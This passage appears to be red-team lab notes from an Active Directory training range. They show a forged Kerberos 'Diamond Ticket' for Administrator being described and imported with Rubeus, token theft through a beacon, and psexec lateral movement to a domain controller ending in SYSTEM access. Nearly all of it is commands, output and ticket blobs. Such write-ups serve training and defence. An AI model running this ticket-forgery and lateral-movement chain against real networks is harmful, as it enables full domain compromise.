Nbnr9dtXpENguNDpF07vxAUd2Xl9pzIt97EIhPaH6ezAWGJJvUfKsDz6szmnJP0mxdG47J4Kt+Wjm35fH3d/4Q3YdOnZUo5RbxtQ94v5mV5fw7GFtekujgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCDzV6MKSMwRJyALo4EirBWuOOxxOVW/YM1MNc102hM1M6ETGxFERVYuQ1lCRVJCT1RJQy5JT6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyMzEyMjIyMDIxMDRaphEYDzIwMjMxMjIzMDYyMTAzWqcRGA8yMDIzMTIyOTIwMjEwM1qoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP


```
command used to `check` the ticket produced from the command above to ensure the parameters are correct. This was completed on `ATTACKER DESKTOP`
```powershell
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIGAjCCBf6gAwIBBaEDAgEWooIE8zCCBO9hggTrMIIE56ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBKEwggSdoAMCARKhAwIBA6KCBI8EggSLpo+ipvpa3xcJeBQ9MGo3ZXBgM7SKLMWR/8dCr6o5XucsniPeCT/5LMWWknYMv/8zMxOzcIJprWXibY5XjlEOJeYcGnJhuzO3Wf/9nzBbOGXFfHio0STRWMY5iQ/wRhlj5uQawq18fM0Fai5Tm6BOtXz90qlNwhupGa3NClAObwc3F+pP3TYK9WGUsbTN1zFtOUNV7InjodltM7p1klis36jS0W8lrFt+bD+aY4DxApos8nsbO+a0WWPY8trJU54I0Pec/DMGABS5EbvtlKa2ZgfVo8qJu4dvdwaGyAzMceZrBjqQAZbmlSTLhwp9yRbixV9nTpknmAThw52jF9UDo5eHPxwzJVgxELH83irKt7D9+0EIRSlfHCSeoP6cPSjeeJzycRWfn1lwHRKvjZYv4V9rsnfSoDrVQX7687qEpVXttWaSLuHhsphawE7FVlKSgxFb7J2vvSZKTRQTWSDOtiBm59OJWaB1b/NhIAzvyW9za9YV7VwHuKwJ0C/DgIU/glqVsgKOCRN/+1ef78xDA7qmT1rMNZ9ORnzJKF0AItQSgj7CdsaP7O+Qvptk5oBJXqARuKHni0ytOQu/plw8avKfZhAh939z0OdXL/pYNDJkkG+/0m3aU+EUSc+puEeJXSJf3/DvsJ67ylUexytnpQ6xoESN2OXM+N1ZXH12mf8Ql0X/ziAuuaAIArxP5ryzmSyUHEWSiDHahqK7mF/qsaVo4wE68xFCL2tkhYsTCO2ywnuL/Bf55rEynkJoiCGrMiG4t2pV+zW4PBbSExRMgtuejQXIVrytt061/efW1H11ajalouMqQYQw50RGlN7MkJlRfOl9AaTg4or5c4FPMfhzsHS+EJY9KobzypUwWgj73ly92xevKuk0RZyC2u/MzWpbAh40zKL73Om+S1l+msBmzhH+IRcdysYDdKdI3ZU994Zk94GMR6Av17qcQcJsMBxnCe1NSzK8UAIsTVw3Xr/ScBrbOMThW7DK1UQW0it2sYeijDO9tpV5lJpGY7EqBvJRMPqHo7Ub/krm3LRS77fPS7Y8/VYhRBgUV/s1YV16n+DSOhhijGIa5S8S77I2aeQXL3hYIfgc1LEOCOApRmpYZnUB1upIYQwKhIOi2Tbv0BntWWtfiWWhaakvg9vZ8YviQoCAUsfLYTDaT7HTh7w+c94R0rG6swK1sXQ5H65A3TdenfQ5c1lqwu4Trhn83uDoWe05r0CU8xqMEr3JM6OX6kSEogJG/cNytYhTykmOQuIZoFQVgxaorK/r9GfsBBMjrGZVo0rgZ5YVV0Pe1O5lhaWZul5/Y54VEO/VroHm0IAhzzt625rxU/qTFCXD+oWJRFTqCfC2SBAGH4FgCSV8tQPq5scf7NMtY2mp6sZnrDGqtqgw5zDW0dLZTRzG64E/foIyvUvGrXuuruTtekujgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCDzV6MKSMwRJyALo4EirBWuOOxxOVW/YM1MNc102hM1M6ETGxFERVYuQ1lCRVJCT1RJQy5JT6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGChAAClERgPMjAyMzEyMjIyMDIxMDRaphEYDzIwMjMxMjIzMDYyMTAzWqcRGA8yMDIzMTIyOTIwMjEwM1qoExsRREVWLkNZQkVSQk9USUMuSU+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2


[*] Action: Describe Ticket


  ServiceName              :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm             :  DEV.CYBERBOTIC.IO
  UserName                 :  Administrator
  UserRealm                :  DEV.CYBERBOTIC.IO
  StartTime                :  22/12/2023 20:21:04
  EndTime                  :  23/12/2023 06:21:03
  RenewTill                :  29/12/2023 20:21:03
  Flags                    :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  81ejCkjMEScgC6OBIqwVrjjscTlVv2DNTDXNdNoTNTM=
```
`import` the `TGT`
```powershell
[12/22 21:40:01] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket: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
   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: Create Process (/netonly)


[*] Using DEV\Administrator:FakePass

[*] Showing process : False
[*] Username        : Administrator
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 12252
[+] Ticket successfully imported!
[+] LUID            : 0x89a57e

```
steal the token
```powershell
beacon> steal_token 12252
[*] Tasked beacon to steal token from PID 12252
[+] host called home, sent: 12 bytes
[+] Impersonated DEV\bfarmer
```
able to access `dc-1`
```powershell
beacon> ls \\dc-1.cyberbotic.io\c$
[*] Tasked beacon to list files in \\dc-1.cyberbotic.io\c$
[+] host called home, sent: 41 bytes
[*] Listing: \\dc-1.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 15:26:54   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     09/26/2023 09:07:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     12/19/2023 21:48:50   ProgramData
          dir     08/15/2022 15:07:48   Recovery
          dir     08/24/2022 11:05:32   Shares
          dir     12/19/2023 21:37:27   System Volume Information
          dir     08/15/2022 15:09:04   Users
          dir     09/26/2023 09:10:03   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     12/22/2023 19:37:16   DumpStack.log.tmp
 1kb      fil     09/25/2023 19:07:33   ExtADSch.log
 384mb    fil     12/22/2023 19:37:16   pagefile.sys

```

# Psexec'ing to DC-1

Once we have a usable `Diamond Ticket` we are able to `psexec` to `DC-1` 

psexec'ing
```powershell
beacon> jump psexec64 dc-1.cyberbotic.io smb
[*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-1337imherebitch) on dc-1.cyberbotic.io via Service Control Manager (\\dc-1.cyberbotic.io\ADMIN$\bf0ad21.exe)
[+] host called home, sent: 332161 bytes
[+] received output:
Started service bf0ad21 on dc-1.cyberbotic.io
[+] established link to child beacon: 10.10.120.10
```
on `DC-1`
```powershell
[+] established link to parent beacon: 10.10.123.102
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are NT AUTHORITY\SYSTEM (admin)

```